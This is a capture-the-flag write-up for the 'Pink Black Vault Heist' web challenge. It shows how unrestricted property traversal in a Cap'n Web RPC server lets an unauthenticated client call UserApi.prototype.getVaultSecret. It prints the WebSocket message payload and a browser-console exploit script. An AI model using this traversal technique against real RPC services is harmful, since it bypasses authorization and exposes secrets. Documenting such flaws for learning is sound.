# Pink Black Vault Heist

Category: `web`  
Status: `solved`  
Flag: `HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}`

Source bundle: `https://github.com/nhannht/ctf2/tree/master/submit/PinkBlackVault`

## Summary

The obvious red herring was the tiny JWT secret. The real bug was in the RPC
layer. The server exposed a JavaScript class as a Cap'n Web capability, and the
client could walk arbitrary property paths on that live object.

That made the intended API boundary meaningless. Instead of staying on the
documented static methods, we could walk into `UserApi.prototype` and call the
instance helper `getVaultSecret()`, which simply returned the module-level
`VAULT_KEY`.

## Artifacts

- Challenge dist: `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist.zip`
- Relevant files:
  - `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/config.js`
  - `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/vault.js`
  - `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/system.js`

## Key Observation

The frontend connects to `ws://host/rpc` and exposes `UserApi` as the `user`
capability. Cap'n Web handles client calls as property walks on the served
object. That means this path is legal:

```text
["user", "prototype", "getVaultSecret"]
```

Once that was clear, the auth logic stopped mattering. `getVaultSecret()`
does not check `isAdmin`, does not require arguments, and does not even use
`this`.

## Early Wrong Model

The tiny JWT secret and the admin-gated public methods were deliberate bait.
That branch looks plausible on first read:

- brute-force or recover the short JWT secret
- become admin through the documented API
- call the vault-opening path honestly

We checked that route first and dropped it quickly. The challenge value and
instance model were wrong for token grinding, and the RPC framework was already
offering a cleaner break: unrestricted property traversal on the live class
object.

## Solve Path

### 1. Ignore the JWT red herring

The dist ships:

```js
export const JWT_SECRET = crypto.randomBytes(5);
```

That looks like a brute-force challenge, but the instance lifetime and point
value were wrong for a GPU grind. The stronger clue was that the service used a
less familiar RPC framework.

### 2. Read the exposed class, not just the documented methods

`vault.js` defines:

```js
export class UserApi {
  static openVaults(token, key) { return new this(token).openVault(key); }
  static audit(token)           { return new this(token).getAuditLog(); }
  static whoAmI(token)          { return new this(token).me(); }

  getVaultSecret() { return VAULT_KEY; }
}
```

The public static methods enforce the “become admin” story. The instance helper
does not.

### 3. Use Cap'n Web property traversal to reach the prototype method

Cap'n Web does not restrict property traversal to a safe exported surface. So
if the server registers `user: UserApi`, the client can continue walking from
`UserApi` into `UserApi.prototype`.

That gives a direct path to the flag-returning method:

```text
UserApi.prototype.getVaultSecret
```

### 4. Pull the result over the WebSocket

No login or JWT is required. The minimal exchange is:

```json
["push", ["pipeline", 0, ["user","prototype","getVaultSecret"], []]]
["pull", 1]
```

## Proof

Server response:

```json
["resolve", 1, "HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}"]
```

In-browser exploit:

```js
const ws = new WebSocket(`ws://${location.host}/rpc`);
ws.onopen = () => {
  ws.send(JSON.stringify(["push", ["pipeline", 0, ["user","prototype","getVaultSecret"], []]]));
  ws.send(JSON.stringify(["pull", 1]));
};
ws.onmessage = e => console.log(e.data);
```

## Reproduction

We did not rely on a repo-local solver script here. The exact browser-console
payload above is the exploit: it walks the Cap'n Web object graph to
`UserApi.prototype.getVaultSecret`, triggers the call, and prints the
`["resolve", 1, "...flag..."]` frame.

## Why the decoy worked

The challenge nudges the solver toward JWT abuse:

- a 40-bit-looking secret
- admin-gated static methods
- audit-log flavor text about vault access

But all of that is upstream of the real flaw. The bug is that the RPC object
graph itself is reachable too deeply.

## Files

- `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/config.js`
- `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/vault.js`
- `problems/PinkBlackVault/Pink_Black_Vault_Heist-dist/system.js`
